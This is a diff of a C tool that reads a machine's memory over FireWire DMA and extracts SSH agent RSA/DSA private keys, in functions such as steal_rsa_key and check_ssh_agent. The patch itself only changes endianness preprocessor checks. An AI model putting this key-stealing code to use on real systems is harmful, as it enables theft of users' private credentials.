@@ -78,7 +78,7 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 {{{
 	addr_t p;
 	BIGNUM* b;
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 	int i;
 #endif
 
@@ -104,7 +104,7 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 		return NULL;
 	}
 
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 	b->d = (BN_ULONG*) endian_swap32((uint32_t)b->d);
 	b->top = endian_swap32(b->top);
 //	b->dmax = endian_swap32(b->dmax);
@@ -133,7 +133,7 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 		printf("failed to read BIGNUM data block @0x%08llx\n", p);
 		return NULL;
 	}
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 	for(i=0; i<b->dmax; i++) {
 		b->d[i] = endian_swap32(b->d[i]);
 	}
@@ -177,7 +177,7 @@ int steal_rsa_key(linear_handle lin, Key* key)
 	key->rsa->meth = NULL;
 	key->rsa->engine = NULL;
 	
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 	key->rsa->pad = endian_swap32(key->rsa->pad);
 	key->rsa->version = endian_swap32(key->rsa->version);
 
@@ -268,7 +268,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	//  p+52  engine (?)
 	key->dsa->engine = NULL;
 
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 	key->dsa->pad = endian_swap32(key->dsa->pad);
 	key->dsa->version = endian_swap32(key->dsa->version);
 	key->dsa->write_params = endian_swap32(key->dsa->write_params);
@@ -411,7 +411,7 @@ void check_ssh_agent(linear_handle lin, char **envv)
 						// do not search the tailing \0 !
 		rcomment = LOCAL_TO_REMOTE(comment, heap);
 		printf("\nfound the string \"" TERM(TERM_A_NORMAL,TERM_C_FG_RED) "%s" TERM_RESET "\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 		rcomment = (char*) endian_swap32((uint32_t)rcomment);
 #endif
 		identity = memmem(heap, AGENT_MAXLEN * 4096, &rcomment, 4);
@@ -429,7 +429,7 @@ void check_ssh_agent(linear_handle lin, char **envv)
 		t = time(NULL);
 		if(linear_read(lin, ridentity+8, &death, 4))
 			break;
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 		death = endian_swap32(death);
 #endif
 		if(death == 0)
@@ -446,7 +446,7 @@ void check_ssh_agent(linear_handle lin, char **envv)
 		if(linear_read(lin, ridentity, &n, 4))
 			break;
 		rkey = n;
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 		rkey = ((uint64_t)endian_swap32((uint32_t)rkey));
 #endif
 		rkey &= 0xffffffff;
@@ -458,7 +458,7 @@ void check_ssh_agent(linear_handle lin, char **envv)
 		    linear_read(lin, rkey+8,  &key.rsa, 4)   ||
 		    linear_read(lin, rkey+12, &key.dsa, 4) )
 			break;
-#ifdef __BIG_ENDIAN__
+#if __BYTE_ORDER == __BIG_ENDIAN
 		key.type = endian_swap32(key.type);
 		key.flags = endian_swap32(key.flags);
 		key.rsa = (RSA*)endian_swap32((uint32_t)key.rsa);
@@ -608,11 +608,11 @@ int main(int argc, char**argv)
 		raw1394_read(phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x0c, 4, &low);
 		raw1394_read(phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x10, 4, &high);
 		// GUID is in big endian or something
-#ifndef __BIG_ENDIAN__  
+#if __BYTE_ORDER == __BIG_ENDIAN
+		guid = (((uint64_t)low) << 32) | high;
+#else 
 		guid = (((uint64_t)high) << 32) | low;
 		guid = endian_swap64(guid);
-#else
-		guid = (((uint64_t)low) << 32) | high;
 #endif
 		uid = malloc(18);
 		snprintf(uid, 17, "%016llx", guid);
